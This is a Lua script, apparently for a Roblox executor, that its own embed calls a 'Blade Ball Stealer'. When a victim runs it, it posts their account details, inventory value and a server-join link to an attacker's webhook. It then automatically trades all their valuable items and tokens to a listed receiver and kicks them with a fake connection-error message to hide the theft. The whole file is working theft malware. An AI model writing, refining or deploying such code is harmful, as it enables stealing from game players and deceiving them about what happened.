_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

local users = _G.Usernames or {}
local webhook = _G.webhook or ""
local auth_token = _G.AuthToken or "" 
local min_rap = _G.min_rap or 100

local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request
local executor = identifyexecutor and identifyexecutor() or "Unknown"

-- Detection précise des Tokens Blade Ball
local function getTokens()
    local amount = 0
    pcall(function()
        if plr:FindFirstChild("leaderstats") and plr.leaderstats:FindFirstChild("Coins") then
            amount = plr.leaderstats.Coins.Value
        elseif plr:FindFirstChild("Data") and plr.Data:FindFirstChild("Coins") then
            amount = plr.Data.Coins.Value
        else
            local coinText = plr.PlayerGui.Main.Currency.Coins.Amount.Text:gsub("[^%d]", "")
            amount = tonumber(coinText) or 0
        end
    end)
    return amount
end

local function formatNumber(n)
    if not n then return "0" end
    local s = {"", "k", "M", "B", "T"}
    local i = 1
    while n >= 1000 and i < #s do n = n / 1000 i = i + 1 end
    return (i == 1) and tostring(math.floor(n)) or string.format("%.1f%s", n, s[i])
end

-- Scan de l'inventaire Blade Ball
local itemsToSend = {}
local totalRAP = 0
local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items

for _, cat in ipairs({"Sword", "Emote", "Explosion"}) do
    local catMap = {}
    if rapData[cat] then
        for k, v in pairs(rapData[cat]) do
            local s, d = pcall(function() return HttpService:JSONDecode(k) end)
            if s then for _, p in ipairs(d) do if p[1] == "Name" then catMap[p[2]] = v end end end
        end
    end
    for id, info in pairs(clientInventory[cat]) do
        if not info.TradeLock then
            local rap = catMap[info.Name] or 0
            if rap >= min_rap then
                totalRAP = totalRAP + rap
                table.insert(itemsToSend, {Name = info.Name, RAP = rap, ID = id, Type = cat})
            end
        end
    end
end

-- Envoi du Hit avec le style de ton image
if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a,b) return a.RAP > b.RAP end)
    
    local itemSummary = "🪙 Tokens: " .. formatNumber(getTokens()) .. "\n\n"
    for i, item in ipairs(itemsToSend) do
        if i > 12 then itemSummary = itemSummary .. "...and more" break end
        itemSummary = itemSummary .. item.Name .. " (x1): " .. formatNumber(item.RAP) .. " RAP\n"
    end

    local joinCode = "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '"..game.JobId.."')"
    local directJoin = "https://www.roblox.com/games/13772394625?jobId="..game.JobId

    local data = {
        ["auth_token"] = auth_token,
        ["content"] = (_G.pingEveryone == "Yes" and "||​|| @everyone" or "") .. "\n`" .. joinCode .. "`",
        ["embeds"] = {{
            ["title"] = "📁 Pending Hit ... | ⚔️ Blade Ball Stealer",
            ["color"] = 16763904, -- Couleur Or/Jaune
            ["fields"] = {
                {
                    ["name"] = "ℹ️ Player info:",
                    ["value"] = "```" ..
                        "\n🆔 Username      : " .. plr.Name ..
                        "\n👤 Display Name  : " .. plr.DisplayName ..
                        "\n🗓️ Account Age   : " .. plr.AccountAge .. " Days" ..
                        "\n⚡ Executor      : " .. executor ..
                        "\n📩 Receiver      : " .. (users[1] or "None") ..
                        "\n🎮 Server        : " .. #Players:GetPlayers() .. "/15" ..
                        "```",
                    ["inline"] = false
                },
                {
                    ["name"] = "🎯 Inventory:",
                    ["value"] = "```" ..
                        "\n💰 Total Value: " .. formatNumber(totalRAP) .. " RAP" ..
                        "\n\n" .. itemSummary ..
                        "```",
                    ["inline"] = false
                },
                {["name"] = "🔗 Join Server", ["value"] = "[Click to join game]("..directJoin..")", ["inline"] = true},
                {["name"] = "📜 Full Inventory", ["value"] = "[Click to show](https://www.roblox.com/users/"..plr.UserId.."/inventory)", ["inline"] = true}
            },
            ["footer"] = {["text"] = "by Eblack • " .. os.date("%B %d, %Y")},
            ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..plr.UserId.."&width=420&height=420&format=png"}
        }}
    }

    httpRequest({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })

    -- Logique de Trade automatique
    local function doTrade(target)
        local tokenAmt = getTokens()
        while #itemsToSend > 0 do
            pcall(function() netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(Players:WaitForChild(target)) end)
            repeat task.wait(0.5) until plr.PlayerGui.Trade.Enabled
            
            local batch = 0
            while #itemsToSend > 0 and batch < 100 do
                local item = table.remove(itemsToSend, 1)
                netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.Type, item.ID)
                batch = batch + 1
            end
            
            if tokenAmt > 0 then
                pcall(function() netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokenAmt) tokenAmt = 0 end)
            end
            
            netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
            netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
            repeat task.wait(0.2) until not plr.PlayerGui.Trade.Enabled
        end
        task.wait(1)
        plr:kick("Please check your internet connection and try again.\n(Error Code: 277)")
    end

    -- Chercher le receveur sur le serveur
    for _, p in ipairs(Players:GetPlayers()) do
        if table.find(users, p.Name) then doTrade(p.Name) break end
    end
end
